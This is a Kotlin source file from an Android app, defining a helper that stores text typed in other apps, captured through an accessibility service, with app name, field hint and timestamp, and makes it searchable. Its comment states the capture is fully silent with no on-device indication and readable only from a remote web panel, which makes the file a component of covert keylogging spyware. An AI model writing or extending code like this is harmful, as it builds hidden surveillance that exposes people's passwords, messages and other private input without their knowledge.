package com.ismartcoding.plain.helpers

import android.content.Context
import android.content.SharedPreferences
import com.ismartcoding.plain.MainApp
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID

/**
 * SharedPreferences-backed JSON store for background keystroke / typed-text events.
 *
 * Each entry captures the text that was typed, the source app package, the
 * field hint when available, and a wall-clock timestamp. We keep at most
 * MAX_ENTRIES rows so the prefs file never grows unbounded.
 *
 * The capture is fully silent — it lives inside the existing accessibility
 * service which the user has already granted, and there is no on-device UI
 * indication whatsoever (per the product brief). The web panel is the only
 * surface that can read or clear the buffer.
 */
object KeystrokeLogHelper {
    private const val PREFS = "plain_keystroke_log"
    private const val K_ENTRIES = "entries"
    private const val K_ENABLED = "enabled"
    private const val K_BUFFER_LIMIT = "buffer_limit"
    const val DEFAULT_BUFFER_LIMIT = 5000
    const val HARD_MAX_ENTRIES = 20000

    data class Entry(
        val id: String,
        val ts: Long,
        val packageName: String,
        val appLabel: String,
        val fieldHint: String,
        val text: String,
    )

    private fun prefs(ctx: Context = MainApp.instance): SharedPreferences =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    fun isEnabled(ctx: Context = MainApp.instance): Boolean =
        prefs(ctx).getBoolean(K_ENABLED, false)

    fun setEnabled(enabled: Boolean, ctx: Context = MainApp.instance) {
        prefs(ctx).edit().putBoolean(K_ENABLED, enabled).apply()
    }

    fun getBufferLimit(ctx: Context = MainApp.instance): Int =
        prefs(ctx).getInt(K_BUFFER_LIMIT, DEFAULT_BUFFER_LIMIT).coerceIn(100, HARD_MAX_ENTRIES)

    fun setBufferLimit(limit: Int, ctx: Context = MainApp.instance) {
        prefs(ctx).edit().putInt(K_BUFFER_LIMIT, limit.coerceIn(100, HARD_MAX_ENTRIES)).apply()
    }

    @Synchronized
    fun append(packageName: String, appLabel: String, fieldHint: String, text: String, ctx: Context = MainApp.instance) {
        if (text.isEmpty()) return
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val obj = JSONObject().apply {
            put("id", UUID.randomUUID().toString())
            put("ts", System.currentTimeMillis())
            put("packageName", packageName)
            put("appLabel", appLabel)
            put("fieldHint", fieldHint)
            put("text", text)
        }
        // Coalesce: if the most recent entry is the same package + field within 4s and the new
        // text strictly extends the previous text, replace it (typing in progress).
        val last = if (arr.length() > 0) arr.optJSONObject(0) else null
        val recently = last != null &&
            last.optString("packageName") == packageName &&
            last.optString("fieldHint") == fieldHint &&
            (System.currentTimeMillis() - last.optLong("ts")) < 4000L
        val merged = JSONArray()
        merged.put(obj)
        val limit = getBufferLimit(ctx)
        var i = if (recently && last != null && text.startsWith(last.optString("text"))) 1 else 0
        while (i < arr.length() && merged.length() < limit) {
            merged.put(arr.get(i))
            i++
        }
        prefs(ctx).edit().putString(K_ENTRIES, merged.toString()).apply()
    }

    fun list(
        offset: Int = 0,
        limit: Int = 200,
        query: String = "",
        packageName: String = "",
        fromTs: Long = 0L,
        toTs: Long = 0L,
        ctx: Context = MainApp.instance,
    ): List<Entry> {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val q = query.trim().lowercase()
        val out = mutableListOf<Entry>()
        var skipped = 0
        var i = 0
        while (i < arr.length() && out.size < limit) {
            try {
                val o = arr.getJSONObject(i)
                val ts = o.optLong("ts")
                val pkg = o.optString("packageName")
                val text = o.optString("text")
                val matchesPkg = packageName.isEmpty() || packageName == pkg
                val matchesText = q.isEmpty() || text.lowercase().contains(q) ||
                    o.optString("appLabel").lowercase().contains(q) ||
                    o.optString("fieldHint").lowercase().contains(q) ||
                    pkg.lowercase().contains(q)
                val matchesFrom = fromTs <= 0L || ts >= fromTs
                val matchesTo = toTs <= 0L || ts <= toTs
                if (matchesPkg && matchesText && matchesFrom && matchesTo) {
                    if (skipped < offset) skipped++
                    else out.add(
                        Entry(
                            id = o.optString("id"),
                            ts = ts,
                            packageName = pkg,
                            appLabel = o.optString("appLabel"),
                            fieldHint = o.optString("fieldHint"),
                            text = text,
                        ),
                    )
                }
            } catch (_: Throwable) {}
            i++
        }
        return out
    }

    fun count(query: String = "", packageName: String = "", fromTs: Long = 0L, toTs: Long = 0L, ctx: Context = MainApp.instance): Int {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val q = query.trim().lowercase()
        var n = 0
        for (i in 0 until arr.length()) {
            try {
                val o = arr.getJSONObject(i)
                val ts = o.optLong("ts")
                val pkg = o.optString("packageName")
                val text = o.optString("text")
                val matchesPkg = packageName.isEmpty() || packageName == pkg
                val matchesText = q.isEmpty() || text.lowercase().contains(q) ||
                    o.optString("appLabel").lowercase().contains(q) ||
                    o.optString("fieldHint").lowercase().contains(q) ||
                    pkg.lowercase().contains(q)
                val matchesFrom = fromTs <= 0L || ts >= fromTs
                val matchesTo = toTs <= 0L || ts <= toTs
                if (matchesPkg && matchesText && matchesFrom && matchesTo) n++
            } catch (_: Throwable) {}
        }
        return n
    }

    /** Distinct package counts for filter chips. */
    fun packageBreakdown(ctx: Context = MainApp.instance): List<Pair<String, Int>> {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val map = mutableMapOf<String, Int>()
        for (i in 0 until arr.length()) {
            try {
                val pkg = arr.getJSONObject(i).optString("packageName")
                if (pkg.isNotEmpty()) map[pkg] = (map[pkg] ?: 0) + 1
            } catch (_: Throwable) {}
        }
        return map.entries.sortedByDescending { it.value }.map { it.key to it.value }
    }

    fun clear(ctx: Context = MainApp.instance) {
        prefs(ctx).edit().remove(K_ENTRIES).apply()
    }

    fun deleteOne(id: String, ctx: Context = MainApp.instance): Boolean {
        val raw = prefs(ctx).getString(K_ENTRIES, "[]") ?: "[]"
        val arr = try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
        val newArr = JSONArray()
        var removed = false
        for (i in 0 until arr.length()) {
            try {
                val o = arr.getJSONObject(i)
                if (o.optString("id") == id) removed = true
                else newArr.put(o)
            } catch (_: Throwable) {}
        }
        if (removed) prefs(ctx).edit().putString(K_ENTRIES, newArr.toString()).apply()
        return removed
    }
}
